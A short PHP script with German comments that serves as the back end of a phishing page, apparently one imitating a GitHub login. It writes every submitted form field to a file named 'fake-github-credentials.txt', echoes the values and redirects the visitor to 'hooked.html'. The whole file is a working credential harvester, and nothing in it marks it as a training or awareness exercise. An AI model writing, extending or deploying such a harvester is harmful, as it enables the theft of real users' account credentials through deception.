<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Öffne Datei zum Anhängen
    $handle = fopen("fake-github-credentials.txt", "a");
    
    foreach ($_POST as $variable => $value) {
        $line = $variable . "-" . $value . "\r\n";
        fwrite($handle, $line);

        // Ausgabe in Konsole
        echo $line;

        // sofort ausgeben (Buffer leeren)
        flush();
    }
    
    fwrite($handle, "\r\n");
    fclose($handle);

    // Redirect, damit die Seite nicht erneut POSTet
    header("Refresh:0; url=hooked.html");
    exit;
}

// Für GET requests: Optional Login-Formular anzeigen
?>
